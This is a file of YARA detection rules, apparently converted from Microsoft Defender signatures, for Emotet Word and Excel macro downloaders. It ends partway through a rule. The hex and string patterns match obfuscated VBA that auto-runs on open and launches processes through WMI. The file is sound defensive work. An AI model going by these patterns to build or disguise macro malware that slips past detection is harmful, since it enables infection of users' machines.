rule TrojanDownloader_O97M_Emotet_2147723817_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet"
        threat_id = "2147723817"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 [0-16] 22 0d 0a 53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 0d 0a 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_2 = ", INKEDLib, InkEdit\"" ascii //weight: 1
        $x_1_3 = ".ShowWindow = 6 < 3" ascii //weight: 1
        $x_1_4 = "\")).Create(" ascii //weight: 1
        $x_1_5 = ".Bookmarks(\"\\Page\").Range.Delete" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_DHE_2147743670_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.DHE!MTB"
        threat_id = "2147743670"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-15] 77 69 [0-15] 6e [0-15] 6d 67 [0-15] 6d [0-15] 74 73 [0-15] 3a 57 69 [0-15] 6e 33 [0-15] 32 5f [0-15] 50 72 6f 63 [0-15] 65 73 73 [0-15] 22 29 29 29}  //weight: 10, accuracy: Low
        $x_10_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-15] 77 [0-15] 69 6e 6d [0-15] 67 [0-15] 6d 74 [0-15] 73 [0-15] 3a 57 [0-15] 69 6e 33 32 [0-15] 5f 50 72 [0-15] 6f 63 [0-15] 65 [0-15] [0-15] 73 73 [0-15] 22 29 29 29}  //weight: 10, accuracy: Low
        $x_10_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-15] 77 69 6e 6d [0-15] 67 6d 74 [0-15] 73 3a 57 [0-15] 69 6e 33 32 [0-15] 5f 50 72 6f 63 [0-15] 65 73 73 [0-15] 22 29 29 29}  //weight: 10, accuracy: Low
        $x_10_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-15] 77 69 6e [0-15] 6d 67 6d 74 [0-15] 35 31 73 3a 57 69 [0-15] 6e 33 32 5f [0-15] [0-15] [0-15] 50 72 6f 63 [0-15] 65 73 73 [0-15] 22 29 29 29}  //weight: 10, accuracy: Low
        $x_1_5 = "hack" ascii //weight: 1
        $x_1_6 = "Steel" ascii //weight: 1
        $x_1_7 = ".ShowWindow = wdXMLValidationStatusOK" ascii //weight: 1
        $x_1_8 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_9 = ", MSForms, TextBox" ascii //weight: 1
        $x_1_10 = "Sub autoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 2 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Emotet_OA_2147743718_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OA!MTB"
        threat_id = "2147743718"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 22 [0-69] 77}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-53] 28 22 70 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c 20 [0-53] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = ", MSForms, TextBox\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OB_2147743727_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OB!MTB"
        threat_id = "2147743727"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-69] 28 [0-69] 28 22 [0-37] 77 [0-37] 69 [0-37] 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-69] 28 [0-69] 28 [0-69] 2e [0-69] 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c 20 [0-53] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = ", MSForms, TextBox\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OC_2147743820_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OC!MTB"
        threat_id = "2147743820"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 28 22 [0-16] 77 [0-16] 69 [0-16] 6e [0-16] 6d [0-16] 67 [0-16] 6d [0-16] 74 [0-16] 73 [0-16] 3a [0-16] 57 [0-16] 69 [0-16] 6e [0-16] 33 [0-16] 32 [0-16] 5f [0-16] 50 [0-16] 72 [0-16] 6f [0-16] 63 [0-16] 65 [0-16] 73 [0-16] 73 [0-16] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-69] 28 [0-69] 28 [0-69] 2e [0-69] 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c 20 [0-53] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = ", MSForms, TextBox\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OC_2147743820_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OC!MTB"
        threat_id = "2147743820"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 28 22 [0-16] 77 [0-16] 69 [0-16] 6e [0-16] 6d [0-64] 67 [0-16] 6d [0-16] 74 [0-16] 73 [0-16] 3a [0-16] 57 [0-16] 69 [0-16] 6e [0-16] 33 [0-16] 32 [0-16] 5f [0-16] 50 [0-48] 72 [0-16] 6f [0-16] 63 [0-16] 65 [0-16] 73 [0-16] 73 [0-16] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-69] 28 [0-69] 28 [0-69] 2e [0-69] 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c 20 [0-53] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = ", MSForms, TextBox\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OC_2147743820_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OC!MTB"
        threat_id = "2147743820"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 28 [0-21] 20 2b 20 22 [0-37] 77 [0-16] 69 [0-16] 6e [0-16] 6d [0-16] [0-80] 67 [0-16] 6d [0-16] 74 [0-16] 73 [0-16] 3a [0-16] 57 [0-16] [0-64] 69 [0-16] 6e [0-16] 33 [0-16] 32 [0-16] 5f [0-16] 50 [0-16] 72 [0-16] 6f [0-16] 63 [0-16] 65 [0-133] 73 [0-16] 73 [0-16] 22 20 2b 20 [0-16] 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-69] 28 [0-69] 28 [0-69] 2e [0-69] 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c 20 [0-53] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = ", MSForms, TextBox\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OD_2147743859_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OD!MTB"
        threat_id = "2147743859"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 62 6a 65 63 74 28 [0-69] 28 [0-85] 20 22 [0-53] 77 [0-53] 69 [0-53] 6e [0-16] 6d [0-48] 67 [0-16] 6d [0-16] 74 [0-16] 73 3a [0-16] 33 57 [0-16] 69 [0-16] 6e [0-53] 33 5f [0-16] 50 [0-16] 72 [0-16] 6f [0-16] 63 [0-16] 65 [0-16] 73 [0-16] 73 [0-21] 22 20 2b 20 [0-21] 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-69] 2c 20 [0-69] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = ", MSForms, ComboBox\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OH_2147743908_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OH!MTB"
        threat_id = "2147743908"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-69] 28 [0-69] 22 [0-53] 77 [0-53] 69 [0-96] 6d [0-53] 67 [0-53] 6d [0-53] 74 [0-53] 73 3a}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-69] 2c 20 [0-69] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = ".ShowWindow = False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OJ_2147743941_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OJ!MTB"
        threat_id = "2147743941"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4d 75 6e 69 66 78 68 6c 75 71 73 28 [0-69] 28 22 [0-32] 77 [0-32] 69 [0-32] [0-32] 6e [0-32] 6d [0-32] 67 [0-32] 6d [0-32] 74 [0-32] 73 [0-32] 3a}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-69] 2c 20 [0-69] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = ", MSForms," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OJ_2147743941_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OJ!MTB"
        threat_id = "2147743941"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {42 66 75 79 64 73 78 64 7a 68 75 6a 70 28 [0-69] 28 22 [0-37] 77 [0-37] 69 [0-37] 6e [0-37] 6d [0-37] 67 [0-37] 6d [0-37] 74 [0-37] 73 [0-37] 3a}  //weight: 1, accuracy: Low
        $x_1_2 = {49 73 7a 79 79 62 71 76 77 74 70 28 [0-69] 28 22 [0-37] 77 [0-37] 69 [0-37] 6e [0-37] 6d [0-37] 67 [0-37] 6d [0-37] 74 [0-37] 73 [0-37] 3a}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 28 [0-69] 2c 20 [0-69] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OK_2147743946_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OK!MTB"
        threat_id = "2147743946"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {67 6d 74 73 [0-32] 3a 57 [0-32] 69 [0-32] 6e [0-37] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-16] 63 [0-37] 65 [0-37] 73 [0-37] 73 [0-37] 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-69] 28 [0-53] 2e [0-53] 2e 43 61 70 74 69 6f 6e 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 28 [0-69] 2c 20 [0-69] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ON_2147743973_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ON!MTB"
        threat_id = "2147743973"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 79 73 72 65 6d 33 32 28 22 [0-32] 77 [0-32] 69 [0-32] 6e [0-32] 6d [0-32] 67 [0-32] 6d [0-32] 74 [0-32] 73 [0-32] 3a [0-32] 57 [0-32] 69 [0-32] 6e 33 [0-32] 32 [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {53 79 73 72 65 6d 33 32 28 [0-53] 2e [0-53] 2e 43 61 70 74 69 6f 6e 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 28 [0-69] 2c 20 [0-69] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OT_2147744034_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OT!MTB"
        threat_id = "2147744034"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 65 74 20 [0-53] 20 3d 20 [0-53] 28 22 [0-32] 77 [0-32] 69 [0-32] 6e [0-32] 6d [0-32] 67 [0-32] 6d [0-32] 74 [0-32] 73 [0-32] 3a 57 [0-32] 69 [0-32] 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 [0-53] 20 3d 20 [0-53] 28 [0-37] 2e [0-37] 2e 43 61 70 74 69 6f 6e 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Create _" ascii //weight: 1
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OU_2147744056_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OU!MTB"
        threat_id = "2147744056"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3a 57 69 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22 2c 20 [0-21] 2c 20 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-21] 2c 20 [0-21] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "0, 0, MSForms, CommandButton\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OV_2147744077_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OV!MTB"
        threat_id = "2147744077"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {5f 50 72 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22 2c 20 [0-32] 28 [0-32] 28 [0-21] 2e [0-21] 2e 43 61 70 74 69 6f 6e 29 29 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-21] 2c 20 [0-21] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "0, 0, MSForms, CommandButton\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OW_2147744112_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OW!MTB"
        threat_id = "2147744112"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 69 6e 6d [0-32] 67 [0-32] 6d [0-32] 74 [0-48] 73 [0-32] 3a [0-32] 57 [0-32] 69 [0-32] 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22 2c 20 [0-32] 28 [0-32] 28 [0-32] 2e [0-32] 2e 43 61 70 74 69 6f 6e 29 29 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-21] 2c 20 [0-21] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "0, 0, MSForms, CommandButton\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OX_2147744143_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OX!MTB"
        threat_id = "2147744143"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6d 67 6d 74 [0-32] 73 [0-32] 3a [0-32] 57 [0-32] 69 [0-32] 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-21] 2c 20 [0-21] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = ".Caption))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OZ_2147744165_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OZ!MTB"
        threat_id = "2147744165"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {33 32 5f 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-21] 2c 20 [0-21] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e [0-37] 2e 43 61 70 74 69 6f 6e 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PB_2147744186_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PB!MTB"
        threat_id = "2147744186"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6d 74 73 3a [0-32] 57 [0-32] 69 [0-37] 6e [0-32] 33 [0-32] 32 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-21] 2c 20 [0-21] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e [0-37] 2e 43 61 70 74 69 6f 6e 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PC_2147744196_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PC!MTB"
        threat_id = "2147744196"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {69 6e 6f 6a [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-21] 2c 20 [0-21] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
